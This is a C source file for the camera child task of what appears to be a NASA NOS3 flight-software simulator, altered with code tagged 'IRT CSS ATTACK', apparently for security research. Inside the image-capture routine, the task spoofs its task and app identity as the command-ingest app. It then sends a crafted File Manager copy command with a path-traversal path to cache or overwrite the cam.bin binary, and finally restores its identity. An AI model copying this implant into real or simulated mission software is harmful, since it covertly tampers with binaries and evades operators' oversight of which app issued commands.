/* Copyright (C) 2009 - 2017 National Aeronautics and Space Administration. All Foreign Rights are Reserved to the U.S. Government.

This software is provided "as is" without any warranty of any, kind either express, implied, or statutory, including, but not
limited to, any warranty that the software will conform to, specifications any implied warranties of merchantability, fitness
for a particular purpose, and freedom from infringement, and any warranty that the documentation will conform to the program, or
any warranty that the software will be error free.

In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or consequential damages,
arising out of, resulting from, or in any way connected with the software or its documentation.  Whether or not based upon warranty,
contract, tort or otherwise, and whether or not loss was sustained from, or arose out of the results of, or use of, the software,
documentation or services provided hereunder

ITC Team
NASA IV&V
ivv-itc@lists.nasa.gov
*/

/*******************************************************************************
** File: cam_child.c
**
** Purpose:
**   This file contains the source code for the CAM Child Task.
**
*******************************************************************************/

#include "cam_child.h"
#include "../../../../../fsw/osal/src/os/shared/inc/os-shared-globaldefs.h"
#include "../../../../../fsw/osal/src/os/shared/inc/os-shared-idmap.h"
#include "/home/nos3/Desktop/github-nos3/fsw/cfe/modules/es/fsw/src/cfe_es_apps.h"

static void undo_spoofing(CFE_ES_TaskId_t TskId, CFE_ES_AppId_t AppId);
osal_id_t CFE_ES_TaskId_ToOSAL(CFE_ES_TaskId_t id);
CFE_ES_AppRecord_t *CFE_ES_LocateAppRecordByID(CFE_ES_AppId_t AppID);
void CFE_ES_LockSharedData(const char *FunctionName, int32 LineNumber);
void CFE_ES_UnlockSharedData(const char *FunctionName, int32 LineNumber);
static inline bool CFE_ES_AppRecordIsMatch(const CFE_ES_AppRecord_t *AppRecPtr, CFE_ES_AppId_t AppID)
{
    return (AppRecPtr != NULL && CFE_RESOURCEID_TEST_EQUAL(AppRecPtr->AppId, AppID));
}

/*                                                            
** CAM Child Task Startup Initialization                       
*/
int32 CAM_ChildInit(void)
{
    int32 result;
    
    /* Create child task (low priority command handler) */
    result = CFE_ES_CreateChildTask(&CAM_AppData.ChildTaskID,
                                    CAM_CHILD_TASK_NAME,
                                    CAM_ChildTask, 0,
                                    CAM_CHILD_TASK_STACK_SIZE,
                                    CAM_CHILD_TASK_PRIORITY, 0);
    
    if (result != CFE_SUCCESS)
    {
        CFE_EVS_SendEvent(CAM_CHILD_INIT_ERR_EID, CFE_EVS_EventType_ERROR,
           "CAM child task initialization error: create task failed: result = %d", result);
    }
    
    return result;
} /* End of CAM_ChildInit() */


/* 
**  Name:  CAM_publish                                       
**                                                                            
**  Purpose:                                                                  
** 		   Break apart functionality, publish received data.
*/
int32 CAM_publish(void)
{
    OS_MutSemTake(CAM_AppData.data_mutex);
        CAM_AppData.Exp_Pkt.msg_count++;
        CFE_SB_TimeStampMsg((CFE_MSG_Message_t *) &CAM_AppData.Exp_Pkt);
        CFE_SB_TransmitMsg((CFE_MSG_Message_t *) &CAM_AppData.Exp_Pkt, true);
    OS_MutSemGive(CAM_AppData.data_mutex);
    return OS_SUCCESS;
} /* End of CAM_publish() */


/* 
**  Name:  CAM_state                                       
**                                                                            
**  Purpose:                                                                  
** 		   	Checks the state of the experiment
**			Holds on pause and quits on stop
*/
int32 CAM_state(void)
{
    int32 result = OS_ERROR;
    uint32 state;

    OS_MutSemTake(CAM_AppData.data_mutex);
        state = CAM_AppData.State;
    OS_MutSemGive(CAM_AppData.data_mutex);
    
    switch (state)
    {
        case CAM_LOW_VOLTAGE:
            CFE_EVS_SendEvent(CAM_LOW_VOLTAGE_EID, CFE_EVS_EventType_INFORMATION, "CAM child task low voltage received");
            break;
        
        case CAM_TIME:
            CFE_EVS_SendEvent(CAM_TIME_EID, CFE_EVS_EventType_INFORMATION, "CAM child task timeout received");
            break;

        case CAM_STOP:
            // Do nothing
            break;
        
        case CAM_PAUSE:
            while (state == CAM_PAUSE)
            {
                OS_MutSemTake(CAM_AppData.data_mutex);
                    state = CAM_AppData.State;
                OS_MutSemGive(CAM_AppData.data_mutex);
                OS_TaskDelay(1000);
            }
            if (state == CAM_STOP)
            {
                result = OS_ERROR;
            }
            result = OS_SUCCESS;
            break;

        default: // CAM_RUN
            result = OS_SUCCESS;
    }
    return result;
}


/* 
**  Name:  CAM_fifo                                          
**                                                                            
**  Purpose:                                                                  
** 		   Read the camera FIFO until commanded to stop, complete, or error occurs.
*/
int32 CAM_fifo(uint16* x, uint8* status)
{   
    int32 result = OS_SUCCESS;

    while( (*status > 0) && (*status <= 8) && (CAM_AppData.Exp_Pkt.msg_count < ((CAM_AppData.Exp_Pkt.length / CAM_DATA_SIZE) + 1) ) )
    // Status is used to track key points such as start and end of the image
    // Limiting this number ensures that cycling through the FIFO repeatedly is avoided
    {   
        // Read a packet
        OS_MutSemTake(CAM_AppData.data_mutex);
            result = CAM_read((char*) &CAM_AppData.Exp_Pkt.data, x, status);
        OS_MutSemGive(CAM_AppData.data_mutex);
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_READ_ERR_EID, CFE_EVS_EventType_ERROR, "CAM read error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;	 
        (*x) = 0;

        // Publish the packet
        result = CAM_publish();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_PUBLISH_ERR_EID, CFE_EVS_EventType_ERROR, "CAM publish error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Delay between messages to allow for processing
        OS_TaskDelay(250);
        //OS_TaskDelay(500); //IRT CSS

        #ifdef STF1_DEBUG
            OS_MutSemTake(CAM_AppData.data_mutex);
                OS_printf("\n status   = %d \n", *status);	
                OS_printf("\n msg_count = %d \n", CAM_AppData.Exp_Pkt.msg_count);
            OS_MutSemGive(CAM_AppData.data_mutex);	
        #endif
    }
    return result;
}


static void undo_spoofing(CFE_ES_TaskId_t TskId, CFE_ES_AppId_t AppId)
{
    //undo task spoofing ==============
    OS_object_token_t token;
    OS_common_record_t *record;
    osal_id_t object_id = CFE_ES_TaskId_ToOSAL(TskId);
            
    int32 return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
    if (return_code == OS_SUCCESS)
    {
        record = OS_ObjectIdGlobalFromToken(&token);

        record->name_entry = "CAM_CHILD_TASK";
        
        OS_ObjectIdRelease(&token);
    }
    //================================

    CFE_ES_AppRecord_t *AppRecPtr;
    //undo app spoofing ---------------------------
    AppRecPtr = CFE_ES_LocateAppRecordByID(AppId);

    CFE_ES_LockSharedData(__func__, __LINE__);

    /*
    * confirm that the app record is a match,
    * which must be done while locked.
    */
    if (CFE_ES_AppRecordIsMatch(AppRecPtr, AppId))
    {
        //undo CI App spoof
        strncpy(AppRecPtr->AppName,"CAM", sizeof(AppRecPtr->AppName)-1);
        return_code                    = CFE_SUCCESS;
    }
    else
    {
        printf("flop sur le undo du spoofing d'app, CFE_ES_ERR_RESOURCEID_NOT_VALID\n");
        return_code     = CFE_ES_ERR_RESOURCEID_NOT_VALID;
    }

    CFE_ES_UnlockSharedData(__func__, __LINE__);
    //---------------------------------------------
}

/* 
**  Name:  CAM_exp                                         
**                                                                            
**  Purpose:                                                                  
** 		   The experiment runs until the parent dies or is commanded to stop by the parent
** 		   but has the ability to be paused and resumed depending on the current state.
*/
int32 CAM_exp(void)
{
    int32  result = OS_ERROR;
    uint8  status = 1;
    uint16 x      = 0;

    while (status == 1)
    {   // Check state
        if (CAM_state() != OS_SUCCESS) break;

        // Initialize Serial Peripheral Interface
        result = CAM_init_spi();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_INIT_SPI_ERR_EID, CFE_EVS_EventType_ERROR, "CAM init spi error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Initialize Inter-Integrated Circuit
        result = CAM_init_i2c();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_INIT_I2C_ERR_EID, CFE_EVS_EventType_ERROR, "CAM init i2c error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Configure Camera for Upload
        result = CAM_config();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_CONFIG_ERR_EID, CFE_EVS_EventType_ERROR, "CAM configure camera for upload error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Configure Registers
        result = CAM_jpeg_init();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_JPEG_INIT_ERR_EID, CFE_EVS_EventType_ERROR, "CAM jpeg init error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Configure Registers
        result = CAM_yuv422();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_YUV422_ERR_EID, CFE_EVS_EventType_ERROR, "CAM yuv422 error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Configure Registers
        result = CAM_jpeg();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_JPEG_ERR_EID, CFE_EVS_EventType_ERROR, "CAM jpeg error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Configure Camera for Size
        result = CAM_setup();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_SETUP_ERR_EID, CFE_EVS_EventType_ERROR, "CAM setup error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Upload Size
        result = CAM_setSize(CAM_AppData.Size);
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_SET_SIZE_ERR_EID, CFE_EVS_EventType_ERROR, "CAM upload size error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Prepare for Capture
        result = CAM_capture_prep();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_CAPTURE_PREP_ERR_EID, CFE_EVS_EventType_ERROR, "CAM capture prep error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        //IRT CSS ATTACK
        /*OS_MutSemTake(Attack_data.data_mutex);
            Attack_data.exp_is_ongoing = true;
        OS_MutSemGive(Attack_data.data_mutex);*/
        uint8_t need_to_add_to_cache = 0;
        OS_MutSemTake(Attack_data.data_mutex);
            need_to_add_to_cache = Attack_data.add_to_cache;
        OS_MutSemGive(Attack_data.data_mutex);

        printf("\033[1m[CHILD] add_to_cache = %d\033[0m\n", need_to_add_to_cache);

        if(need_to_add_to_cache)
        {
            //init task spoofing ================
            char temp[20];
            CFE_ES_TaskId_t TskId;
            int32 return_code;
            OS_common_record_t *record;
            osal_id_t object_id;
            OS_object_token_t token;
            CFE_ES_GetTaskID(&TskId);
            CFE_ES_AppId_t         AppId;
            CFE_ES_GetAppID(&AppId);
            
            object_id = CFE_ES_TaskId_ToOSAL(TskId);
        
            return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
            if (return_code == OS_SUCCESS)
            {
                record = OS_ObjectIdGlobalFromToken(&token);

                record->name_entry = "CI Custom Main Task";
                
                OS_ObjectIdRelease(&token);
            }
            else
            {
                printf("error getting token from objectid\n");
                undo_spoofing(TskId, AppId);
                break;
            }
            //==================================

            //init app spoofing ----------------------
            CFE_ES_AppRecord_t *AppRecPtr;

            /*
            ** Get App Record
            */
            AppRecPtr = CFE_ES_LocateAppRecordByID(AppId);

            CFE_ES_LockSharedData(__func__, __LINE__);

            /*
            * confirm that the app record is a match,
            * which must be done while locked.
            */
            if (CFE_ES_AppRecordIsMatch(AppRecPtr, AppId))
            {
                //spoof CI App
                strncpy(AppRecPtr->AppName,"CI", sizeof(AppRecPtr->AppName)-1);
                return_code                    = CFE_SUCCESS;
            }
            else
            {
                printf("flop sur le spoofing d'app, CFE_ES_ERR_RESOURCEID_NOT_VALID\n");
                return_code     = CFE_ES_ERR_RESOURCEID_NOT_VALID;
            }

            CFE_ES_UnlockSharedData(__func__, __LINE__);
            //----------------------------------------

            char file_name[64];
            OS_MutSemTake(Attack_data.data_mutex);
                strncpy(file_name, Attack_data.filename, sizeof(file_name));
                //no forcing of last byte to be '\0' as it is handled in cam_app.c
            OS_MutSemGive(Attack_data.data_mutex);
            //FM command to copy the file and cache it
            printf("caching the file...\n");
            OS_MutSemTake(Attack_data.data_mutex);
                printf("\033[1m[CHILD-consistency] add_to_cache = %d\033[0m\n", Attack_data.add_to_cache);
            OS_MutSemGive(Attack_data.data_mutex);

            //Tagged on 8th byte with 28 (A30 + 10)
            uint8_t fm_copy[] = {0x18,0x8c,0xc0,0x00,0x00,0x83,0x02,0x28,0x00,0x00,0x2f,0x68,0x6f,0x6d,0x65,0x2f,0x6e,0x6f,0x73,0x33,0x2f,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x2f,0x67,0x69,0x74,0x68,0x75,0x62,0x2d,0x6e,0x6f,0x73,0x33,0x2f,0x73,0x69,0x6d,0x73,0x2f,0x62,0x75,0x69,0x6c,0x64,0x2f,0x62,0x69,0x6e,0x2f,0x63,0x61,0x6d,0x2e,0x62,0x69,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2f,0x64,0x61,0x74,0x61,0x2f,0x63,0x61,0x6d,0x2f,0x6c,0x61,0x74,0x5f,0x6c,0x6f,0x6e,0x67,0x2e,0x6f,0x75,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            char source_file[] = "/data/../../../../../sims/build/bin/cam.bin";
            memcpy(&fm_copy[10],source_file,sizeof(source_file));
            memcpy(&fm_copy[74],file_name,64);

            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) fm_copy, true);

            printf("file %s copied to %s!\n", source_file, file_name);

            //undo spoofing
            undo_spoofing(TskId, AppId);
        }
        else //USE CACHED VERSION
        {
            //init task spoofing ================
            char temp[20];
            CFE_ES_TaskId_t TskId;
            int32 return_code;
            OS_common_record_t *record;
            osal_id_t object_id;
            OS_object_token_t token;
            CFE_ES_GetTaskID(&TskId);
            CFE_ES_AppId_t         AppId;
            CFE_ES_GetAppID(&AppId);
            
            object_id = CFE_ES_TaskId_ToOSAL(TskId);
        
            return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
            if (return_code == OS_SUCCESS)
            {
                record = OS_ObjectIdGlobalFromToken(&token);

                record->name_entry = "CI Custom Main Task";
                
                OS_ObjectIdRelease(&token);
            }
            else
            {
                printf("error getting token from objectid\n");
                undo_spoofing(TskId, AppId);
                break;
            }
            //===================================

            //init app spoofing ----------------------
            CFE_ES_AppRecord_t *AppRecPtr;

            /*
            ** Get App Record
            */
            AppRecPtr = CFE_ES_LocateAppRecordByID(AppId);

            CFE_ES_LockSharedData(__func__, __LINE__);

            /*
            * confirm that the app record is a match,
            * which must be done while locked.
            */
            if (CFE_ES_AppRecordIsMatch(AppRecPtr, AppId))
            {
                //spoof CI App
                strncpy(AppRecPtr->AppName,"CI", sizeof(AppRecPtr->AppName)-1);
                return_code                    = CFE_SUCCESS;
            }
            else
            {
                printf("flop sur le spoofing d'app, CFE_ES_ERR_RESOURCEID_NOT_VALID\n");
                return_code     = CFE_ES_ERR_RESOURCEID_NOT_VALID;
            }

            CFE_ES_UnlockSharedData(__func__, __LINE__);
            //----------------------------------------

            char source_file[64];
            OS_MutSemTake(Attack_data.data_mutex);
                strncpy(source_file, Attack_data.filename, sizeof(source_file));
                //no forcing of last byte to be '\0' as it is handled in cam_app.c
            OS_MutSemGive(Attack_data.data_mutex);
            //FM command to copy the cached file in place of the real file
            printf("overwriting with cache...\n");
            OS_MutSemTake(Attack_data.data_mutex);
                printf("\033[1m[CHILD-consistency] add_to_cache = %d\033[0m\n", Attack_data.add_to_cache);
            OS_MutSemGive(Attack_data.data_mutex);
    
            //Tagged on 8th byte with 28 (A30 + 10) - Overwrite set to 1, source = source_file, dest = dest_file
            uint8_t fm_copy[] = {0x18,0x8c,0xc0,0x00,0x00,0x83,0x02,0x28,0x01,0x00,0x2f,0x68,0x6f,0x6d,0x65,0x2f,0x6e,0x6f,0x73,0x33,0x2f,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x2f,0x67,0x69,0x74,0x68,0x75,0x62,0x2d,0x6e,0x6f,0x73,0x33,0x2f,0x73,0x69,0x6d,0x73,0x2f,0x62,0x75,0x69,0x6c,0x64,0x2f,0x62,0x69,0x6e,0x2f,0x63,0x61,0x6d,0x2e,0x62,0x69,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2f,0x64,0x61,0x74,0x61,0x2f,0x63,0x61,0x6d,0x2f,0x6c,0x61,0x74,0x5f,0x6c,0x6f,0x6e,0x67,0x2e,0x6f,0x75,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            char dest_file[] = "/data/../../../../../sims/build/bin/cam.bin";
            memcpy(&fm_copy[10],source_file,sizeof(source_file));
            memcpy(&fm_copy[74],dest_file,64);

            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) fm_copy, true);

            printf("file %s copied to %s!\n", source_file, dest_file);

            //undo spoofing
            undo_spoofing(TskId, AppId);
        }

        // Capture Image
        result = CAM_capture();
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_CAPTURE_ERR_EID, CFE_EVS_EventType_ERROR, "CAM capture error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Read FIFO Size
        result = CAM_read_fifo_length(&CAM_AppData.Exp_Pkt.length);
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_READ_FIFO_LEN_ERR_EID, CFE_EVS_EventType_ERROR, "CAM read fifo length error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Prepare for FIFO Read
        OS_MutSemTake(CAM_AppData.data_mutex);
            CAM_AppData.Exp_Pkt.msg_count = 0x0000;
            result = CAM_read_prep((char*) &CAM_AppData.Exp_Pkt.data, (uint16*) &x);
        OS_MutSemGive(CAM_AppData.data_mutex);
        if (result != OS_SUCCESS)
        {	
            CFE_EVS_SendEvent(CAM_READ_PREP_ERR_EID, CFE_EVS_EventType_ERROR, "CAM read prep error");
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
        }
        if (CAM_state() != OS_SUCCESS) break;

        // Read FIFO
        result = CAM_fifo((uint16*) &x, (uint8*) &status);
        
        //IRT CSS ATTACK
        OS_MutSemTake(Attack_data.data_mutex);
            Attack_data.exp_is_ongoing = false;
            Attack_data.add_to_cache = 0;
        OS_MutSemGive(Attack_data.data_mutex);
        break;
    }

    return result;
}

/* 
**  Name:  CAM_ChildTask                                          
**                                                                            
**  Purpose:                                                                  
** 		   The child task remains active until provided the binary semaphore by the parent
**         when and experiment is kicked off.
*/
void CAM_ChildTask(void)
{
    int32  result;
    int32  state;

    CFE_EVS_SendEvent(CAM_CHILD_INIT_EID, CFE_EVS_EventType_INFORMATION, "CAM child task initialization complete");

    while (true)
    {
        // Block on Semaphore
        OS_BinSemTake(CAM_AppData.sem_id);

        // Check State
        OS_MutSemTake(CAM_AppData.data_mutex);
            state = CAM_AppData.State;
        OS_MutSemGive(CAM_AppData.data_mutex);
        if (state == CAM_PAUSE)
        {
            while(CAM_state() != OS_SUCCESS);
        }

        // Initialize Child Process Flags
        OS_MutSemTake(CAM_AppData.data_mutex);
            CAM_AppData.State = CAM_RUN;
            switch (CAM_AppData.Exp)
            {
                case 1:
                    #ifdef OV2640
                        CAM_AppData.Size = size_160x120;
                    #endif
                    #ifdef OV5640
                        CAM_AppData.Size = size_320x240;
                    #endif
                    #ifdef OV5642
                        CAM_AppData.Size = size_320x240;
                    #endif
                    break;
                case 2:
                    #ifdef OV2640
                        CAM_AppData.Size = size_800x600;
                    #endif
                    #ifdef OV5640
                        CAM_AppData.Size = size_1600x1200;
                    #endif
                    #ifdef OV5642
                        CAM_AppData.Size = size_1600x1200;
                    #endif
                    break;
                case 3:
                    #ifdef OV2640
                        CAM_AppData.Size = size_1600x1200;
                    #endif
                    #ifdef OV5640
                        CAM_AppData.Size = size_2592x1944;
                    #endif
                    #ifdef OV5642
                        CAM_AppData.Size = size_2592x1944;
                    #endif
                    break;
                default:
                    CFE_EVS_SendEvent(CAM_CHILD_EXP_ERR_EID, CFE_EVS_EventType_ERROR, "CAM experiment ID error");
                    CAM_AppData.State = CAM_STOP;
                    break;
            }
        OS_MutSemGive(CAM_AppData.data_mutex);

        // Run Experiment
        result = CAM_exp();
        // Check Result
        OS_MutSemTake(CAM_AppData.data_mutex);
            if ((result == OS_SUCCESS) && (CAM_AppData.State == CAM_RUN))
            {
                switch (CAM_AppData.Exp)
                {
                    case 1:
                        CFE_EVS_SendEvent(CAM_EXP1_EID, CFE_EVS_EventType_INFORMATION, "CAM EXP1 Complete");
                        break;
                    case 2:
                        CFE_EVS_SendEvent(CAM_EXP2_EID, CFE_EVS_EventType_INFORMATION, "CAM EXP2 Complete");
                        break;
                    case 3:
                        CFE_EVS_SendEvent(CAM_EXP3_EID, CFE_EVS_EventType_INFORMATION, "CAM EXP3 Complete");
                        break;
                    default:
                        break;
                }
                // Delay to allow for all CAM Tlm messages to be cleared from pipe
                //OS_TaskDelay(10000);
            }
            // Cleanup
            CAM_AppData.State = CAM_STOP;
        OS_MutSemGive(CAM_AppData.data_mutex);
        //IRT CSS FIX MUTEX
        OS_TaskDelay(2000);
    }

    /* This call allows cFE to clean-up system resources */
    CFE_EVS_SendEvent(CAM_CHILD_INIT_EID, CFE_EVS_EventType_INFORMATION,
        "CAM child task exit complete");
    CFE_ES_ExitChildTask();
} /* End of CAM_ChildTask() */


/************************/
/*  End of File Comment */
/************************/
